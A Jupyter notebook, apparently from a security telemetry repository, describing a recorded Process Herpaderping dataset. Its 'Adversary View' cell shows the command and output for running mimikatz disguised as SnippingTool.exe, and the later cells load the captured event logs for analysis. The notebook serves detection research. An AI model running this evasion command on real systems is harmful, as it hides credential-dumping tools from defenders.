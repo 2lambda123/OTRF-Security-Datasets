{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4b8dc61f",
   "metadata": {},
   "source": [
    "# Process Herpaderping Mimikatz"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b466c116",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e35f9c8b",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/26 |\n",
    "| Modification Date | 2020/10/26 |\n",
    "| Tactics           | [TA0004](https://attack.mitre.org/tactics/TA0004),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1055](https://attack.mitre.org/techniques/T1055) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a025e97b",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents the execution of a Process Herpaderping to obscure the intentions of a process by modifying the content on disk after the image has been mapped."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "53335aee",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "34b85486",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "60566acf",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ec7d70a",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3eb5c1a7",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | Cmd | [Cmd](https://github.com/jxy-s/herpaderping) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03911464",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "C:\\Users\\wardog>cd Desktop\n",
    "\n",
    "C:\\Users\\wardog\\Desktop>ProcessHerpaderping.exe mimikatz.exe wardog.exe C:\\Windows\\system32\\SnippingTool.exe\n",
    "Process Herpaderping Tool - Copyright (c) 2020 Johnny Shaw\n",
    "[12140:10252][OK]    Source File: \"mimikatz.exe\"\n",
    "[12140:10252][OK]    Target File: \"wardog.exe\"\n",
    "[12140:10252][INFO]  Copied source binary to target file\n",
    "[12140:10252][INFO]  Created image section for target\n",
    "[12140:10252][INFO]  Created process object, PID 8924\n",
    "[12140:10252][INFO]  Located target image entry RVA 0x000c3aec\n",
    "[12140:10252][OK]    Replacing target with \"C:\\Windows\\system32\\SnippingTool.exe\"\n",
    "[12140:10252][OK]    Preparing target for execution\n",
    "[12140:10252][INFO]  Writing process parameters, remote PEB ProcessParameters 0x0000000000AED020\n",
    "[12140:10252][INFO]  Creating thread in process at entry point 0x00007FF733E63AEC\n",
    "[12140:10252][INFO]  Created thread, TID 12112\n",
    "[12140:10252][OK]    Waiting for herpaderped process to exit\n",
    "[12140:10252][OK]    Herpaderped process exited with code 0xc000013a\n",
    "[12140:10252][OK]    Process Herpaderp Succeeded\n",
    "\n",
    "C:\\Users\\wardog\\Desktop>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb777d08",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "491520cb",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65ab6f17",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "091876cd",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c54b979",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1dfb4c45",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55c0627b",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ffdb1bc3",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/jxy-s/herpaderping](https://github.com/jxy-s/herpaderping) \n",
    "* [https://twitter.com/jxy__s/status/1320853852153769984](https://twitter.com/jxy__s/status/1320853852153769984) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
